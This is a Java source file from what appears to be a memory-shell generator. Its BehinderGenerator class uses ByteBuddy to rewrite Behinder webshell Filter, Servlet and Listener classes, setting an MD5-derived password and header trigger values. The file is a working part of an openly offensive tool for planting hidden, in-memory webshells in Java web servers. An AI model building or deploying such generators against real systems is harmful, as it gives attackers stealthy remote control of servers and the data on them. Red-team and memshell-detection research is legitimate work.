package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.memshell.config.BehinderConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderCustomFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderCustomListener;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderCustomServlet;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.codec.digest.DigestUtils;

import static net.bytebuddy.matcher.ElementMatchers.named;

public class BehinderGenerator extends ByteBuddyShellGenerator<BehinderConfig> {
    public BehinderGenerator(ShellConfig shellConfig, BehinderConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    public DynamicType.Builder<?> getBuilder() {
        if ("custom".equalsIgnoreCase(shellToolConfig.getProtocol())) {
            Class<?> customShellClass = getCustomShellClass();
            return new ByteBuddy()
                    .redefine(customShellClass)
                    .field(named("headerName")).value(shellToolConfig.getHeaderName())
                    .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
        } else {
            String md5Key = DigestUtils.md5Hex(shellToolConfig.getPass()).substring(0, 16);
            return new ByteBuddy()
                    .redefine(shellToolConfig.getShellClass())
                    .field(named("pass")).value(md5Key)
                    .field(named("headerName")).value(shellToolConfig.getHeaderName())
                    .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
        }
    }

    private Class<?> getCustomShellClass() {
        String shellType = shellConfig.getShellType();
        if (shellType.contains("Filter")) {
            return BehinderCustomFilter.class;
        } else if (shellType.contains("Servlet")) {
            return BehinderCustomServlet.class;
        } else if (shellType.contains("Listener")) {
            return BehinderCustomListener.class;
        }
        return BehinderCustomFilter.class;
    }
}
